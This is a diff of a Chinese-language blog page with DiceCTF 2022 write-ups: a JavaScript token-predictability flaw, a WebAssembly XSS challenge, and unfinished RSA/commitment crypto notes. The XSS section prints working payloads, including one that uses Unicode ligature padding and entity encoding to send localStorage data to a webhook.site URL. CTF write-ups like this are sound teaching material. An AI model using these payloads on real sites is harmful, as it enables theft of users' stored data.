@@ -6,12 +6,10 @@
     <meta charset="utf-8">
     <meta name="keywords" content="DiceCTF_2022, 学习记录">
     <meta name="description" content="
-
 力争在过年之前复现完今年所有我参加过的Crypto题目
 
-
 Webknock-knock-密码学函数使用不当题目描述Knock knock? Who’s there? Another pastebin!!
-题目内容const crypt">
+题目内容const crypto ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -506,10 +504,8 @@ Webknock-knock-密码学函数使用不当题目描述Knock knock? Who’s there
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>力争在过年之前复现完今年所有我参加过的Crypto题目</p>
 <span id="more"></span>
-
 <h2 id="web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="knock-knock-密码学函数使用不当"><a href="#knock-knock-密码学函数使用不当" class="headerlink" title="knock-knock-密码学函数使用不当"></a><strong>knock-knock</strong>-密码学函数使用不当</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>Knock knock? Who’s there? Another pastebin!!</p>
 <h4 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -574,11 +570,10 @@ app<span class="token punctuation">.</span><span class="token function">listen</
   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'listening on port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>本题是根据id和token访问对应的笔记。阅读源代码会发现 flag 应是在 id&#x3D;0 的位置，但是我们不知道这个位置对应的token 是什么。代码告诉我们 token 的生成是 sha256 和随机密钥的消息认证码，在不知道密钥的前提下是无法获得 token 的，所以问题在何处？</p>
+<p>本题是根据id和token访问对应的笔记。阅读源代码会发现 flag 应是在 id=0 的位置，但是我们不知道这个位置对应的token 是什么。代码告诉我们 token 的生成是 sha256 和随机密钥的消息认证码，在不知道密钥的前提下是无法获得 token 的，所以问题在何处？</p>
 <p>如果你足够细心，会发现 <code>Crypto.randomUUID</code> 在调用的时候没有带括号，<code>randomUUID</code>是一个函数（我不知道为什么JS允许这种代码书写方法而不报错），不加括号地调用它是一个未定义的行为。</p>
 <p><img src="/images/DiceCTF-2022/image-20221126095046003.png" alt="image-20221126095046003"></p>
-<p>所以我们在本地用id&#x3D;0运行一遍就可以得到和flag相同的token了，如果node版本一致的话。题目的node版本是FROM node:17.4.0-buster-slim</p>
+<p>所以我们在本地用id=0运行一遍就可以得到和flag相同的token了，如果node版本一致的话。题目的node版本是FROM node:17.4.0-buster-slim</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token keyword">function</span> <span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token parameter">id<span class="token punctuation">,</span>secret</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
@@ -593,7 +588,6 @@ app<span class="token punctuation">.</span><span class="token function">listen</
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">generateToken</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>secret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><p><a target="_blank" rel="noopener" href="https://blog.bitwarriors.net/blog/dice-ctf-knock-knock-web/">BitWarriors Blog - BitWarriors Blog</a></p>
 <h3 id="blazingfast-xss"><a href="#blazingfast-XSS" class="headerlink" title="blazingfast-XSS"></a><strong>blazingfast</strong>-XSS</h3><h4 id="题目描述"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="/images/DiceCTF-2022/image-20221129201952585.png" alt="image-20221129201952585"></p>
 <h4 id="题目内容"><a href="#题目内容-1" class="headerlink" title="题目内容"></a>题目内容</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//admin-bot.js</span>
@@ -619,9 +613,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h4 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h4><p>进入题目页面：</p>
 <p><img src="/images/DiceCTF-2022/website.png" alt="website.png"></p>
 <p>习惯性查看源码发现</p>
@@ -672,7 +663,6 @@ WebAssembly<span class="token punctuation">.</span><span class="token function">
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>有陌生函数 <code>WebAssembly.instantiateStreaming</code>，翻阅文档 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/JavaScript_interface/instantiateStreaming">https://developer.mozilla.org/zh-CN/docs/WebAssembly/JavaScript_interface/instantiateStreaming</a></p>
 <p><img src="/images/DiceCTF-2022/image-20221129203215948.png" alt="image-20221129203215948"></p>
 <p><img src="/images/DiceCTF-2022/image-20221129203234924.png" alt="image-20221129203234924"></p>
@@ -683,7 +673,6 @@ WebAssembly<span class="token punctuation">.</span><span class="token function">
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo-submit'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 		<span class="token function">demo</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>给 id 为 demo-submit 的元素绑定一个 onclick事件，当我们点击的时候会触发 demo 函数。该函数会获取 id为 demo 的元素的值作为 demo 函数的参数。</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -691,13 +680,11 @@ WebAssembly<span class="token punctuation">.</span><span class="token function">
 		document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> query<span class="token punctuation">;</span>
 		<span class="token function">demo</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>以上代码段获取 网页 URL中的demo参数值并将其赋值给 id 为 demo 的元素，最后送到 demo函数进行处理。</p>
 <pre class="line-numbers language-none"><code class="language-none">function demo(str) &#123;
 	document.getElementById(&#39;result&#39;).innerHTML &#x3D; mock(str);
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>可以看到 mock函数的返回结果被插入到 id 为 result的元素中，这很显然是一个 XSS的点 ！继续看看mock函数</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">mock</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 	blazingfast<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -722,7 +709,6 @@ WebAssembly<span class="token punctuation">.</span><span class="token function">
 		<span class="token keyword">return</span> mocking<span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>经过以上一通分析，我们知道我们可以在 demo参数输入数据并将其传入到 blazingfast.mock函数进行处理，而 这个函数正是来自于 <code>blazingfast.c</code>。具体可以看一下这个：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/68048524">https://zhuanlan.zhihu.com/p/68048524</a></p>
 <p>看看 c 代码吧：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">int length, ptr &#x3D; 0;
@@ -756,7 +742,6 @@ int mock() &#123;
 
 	return 0;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可恶啊，传入 mock 函数的 字符串 不可以有大于号、小于号、于号、双引号。我们的 XSS payload遭受了挑战。从这篇文章获得灵感：<a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/XSS_20_characters">https://jlajara.gitlab.io/XSS_20_characters</a></p>
 <p><img src="/images/DiceCTF-2022/image-20221129211545783.png" alt="image-20221129211545783"></p>
 <p>注意上图不是两个 ff，是一个长的很像两个 ff 的单个 Unicode字符。妙处发生在浏览器在解释这个字符的时候，会将其扩展为两个 ff，这就导致长度增加了（由1到2）。如果是 Unicode 字符 ffi，则长度由1变到3</p>
@@ -766,26 +751,20 @@ int mock() &#123;
 <p>我们可以填充特别多的 ffi，然后其后面插入我们的XSS payload 进行攻击。</p>
 <pre class="line-numbers language-none"><code class="language-none">ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p><img src="/images/DiceCTF-2022/ALERT_ERROR.png" alt="ALERT_ERROR"></p>
 <p>但是直接传入会爆出一个 ALERT 未定义的错误，这是因为我们的输入在处理过程中被传成大写了。</p>
 <p>可以通过将大小写敏感的函数进行 html 编码解决。经过我的测试，只需要将函数名编码即可。单引号、左右括号、点号都是不需要编码的。</p>
 <p><img src="/images/DiceCTF-2022/image-20221201173939780.png" alt="image-20221201173939780"></p>
 <pre class="line-numbers language-none"><code class="language-none">ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ&lt;img src&#x3D;x onerror&#x3D;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;(1)&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>成功弹窗</p>
 <p><img src="/images/DiceCTF-2022/image-20221201174303412.png" alt="image-20221201174303412"></p>
 <p>紧接着提取 flag 到 我们自己的服务器上</p>
 <p><img src="/images/DiceCTF-2022/image-20221129220657681.png" alt="image-20221129220657681"></p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;x onerror&#x3D;location.href&#x3D;&#39;https:&#x2F;&#x2F;webhook.site&#x2F;38689352-bda5-4841-80e3-4a48e1655deb?q&#x3D;&#39;.toLowerCase()+localStorage.getItem(&#39;flag&#39;.toLowerCase())&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token operator">&amp;</span>#X6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X63</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X61</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X74</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X69</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6e<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token constant">X68</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X72</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X66</span><span class="token punctuation">;</span><span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token constant">X27</span><span class="token punctuation">;</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>webhook<span class="token punctuation">.</span>site<span class="token operator">/</span><span class="token number">38689352</span><span class="token operator">-</span>bda5<span class="token operator">-</span><span class="token number">4841</span><span class="token operator">-</span><span class="token number">80e3</span><span class="token operator">-</span>4a48e1655deb<span class="token operator">?</span>q<span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token constant">X27</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token constant">X74</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X4c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X77</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X72</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X43</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X61</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X73</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token constant">X2B</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X63</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X61</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X53</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X74</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X72</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X61</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X67</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token constant">X67</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X74</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X49</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X74</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6d<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token constant">X27</span><span class="token punctuation">;</span>flag<span class="token operator">&amp;</span>#<span class="token constant">X27</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token constant">X74</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X4c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#X6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X77</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X72</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X43</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X61</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X73</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token constant">X65</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h4 id="引用"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h4><p><a target="_blank" rel="noopener" href="https://sekai.team/blog/dice-ctf-2022/blazingfast/">https://sekai.team/blog/dice-ctf-2022/blazingfast/</a></p>
 <h3 id="no-cookies"><a href="#no-cookies" class="headerlink" title="no-cookies"></a>no-cookies</h3><h4 id="题目描述"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>I found a more secure way to authenticate users. No cookies, no problems!</p>
 <h4 id="解题分析"><a href="#解题分析-1" class="headerlink" title="解题分析"></a>解题分析</h4><p>先审计 <code>adminbot.js</code> ，发现又有我看不懂的代码段。比如 <code>export</code> 语句是干啥的？我在这一篇文章找到了答案：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/541256d8abb3">export、export default和import用法详解，这一篇就够了 - 简书 (jianshu.com)</a></p>
@@ -813,11 +792,9 @@ print(f&quot;N &#x3D; &#123;N&#125;&quot;)
 print(f&quot;e &#x3D; &#123;e&#125;&quot;)
 print(f&quot;cipher &#x3D; &#123;cipher&#125;&quot;)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">N &#x3D; 57996511214023134147551927572747727074259762800050285360155793732008227782157
 e &#x3D; 17
 cipher &#x3D; 19441066986971115501070184268860318480501957407683654861466353590162062492971<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <h4 id="解题分析"><a href="#解题分析-2" class="headerlink" title="解题分析"></a>解题分析</h4><h4 id="引用"><a href="#引用-3" class="headerlink" title="引用"></a>引用</h4><p><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/81949/how-to-compute-m-value-from-rsa-if-phin-is-not-relative-prime-with-the-e/81966#81966">https://crypto.stackexchange.com/questions/81949/how-to-compute-m-value-from-rsa-if-phin-is-not-relative-prime-with-the-e/81966#81966</a></p>
 <p><a target="_blank" rel="noopener" href="https://eprint.iacr.org/2020/1059.pdf">https://eprint.iacr.org/2020/1059.pdf</a></p>
 <h3 id="commitment-issues"><a href="#Commitment-Issues" class="headerlink" title="Commitment Issues"></a>Commitment Issues</h3><h4 id="题目描述"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>I created a new commitment scheme, but commitment is scary so I threw away the key.</p>
@@ -859,9 +836,8 @@ c1, c2 &#x3D; commit(s, r, n)
 print(f&#39;N &#x3D; &#123;hex(N)&#125;&#39;)
 print(f&#39;c1 &#x3D; &#123;hex(c1)&#125;&#39;)
 print(f&#39;c2 &#x3D; &#123;hex(c2)&#125;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h4 id="解题分析"><a href="#解题分析-3" class="headerlink" title="解题分析"></a>解题分析</h4><p>该挑战基于一个传统的 RSA 签名承诺方案（commitment scheme）。在求解该问题之前，</p>
-<h4 id="引用"><a href="#引用-4" class="headerlink" title="引用"></a>引用</h4><p><a target="_blank" rel="noopener" href="https://org.anize.rs/dicectf-2022/crypto/commitment_issues%EF%BC%88%E5%BE%88%E8%AF%A6%E7%BB%86%E7%9A%84%E4%B8%80%E4%B8%AA%E8%AE%B2%E8%A7%A3%EF%BC%8C%E8%87%B4%E6%95%AC%EF%BC%81%EF%BC%89">https://org.anize.rs/dicectf-2022/crypto/commitment_issues（很详细的一个讲解，致敬！）</a></p>
+<h4 id="引用"><a href="#引用-4" class="headerlink" title="引用"></a>引用</h4><p><a target="_blank" rel="noopener" href="https://org.anize.rs/dicectf-2022/crypto/commitment_issues（很详细的一个讲解，致敬！）">https://org.anize.rs/dicectf-2022/crypto/commitment_issues（很详细的一个讲解，致敬！）</a></p>
 <h3 id="官方仓库地址"><a href="#官方仓库地址" class="headerlink" title="官方仓库地址"></a>官方仓库地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/dicegang/dicectf-2022-challenges">https://github.com/dicegang/dicectf-2022-challenges</a></p>
 
                 
@@ -1166,7 +1142,6 @@ print(f&#39;c2 &#x3D; &#123;hex(c2)&#125;&#39;)<span aria-hidden="true" class="l
                     <div class="summary block-with-text">
                         
                             
-
 大早上太困了，随便敲键盘记录一下
                         
                     </div>
@@ -1249,7 +1224,7 @@ print(f&#39;c2 &#x3D; &#123;hex(c2)&#125;&#39;)<span aria-hidden="true" class="l
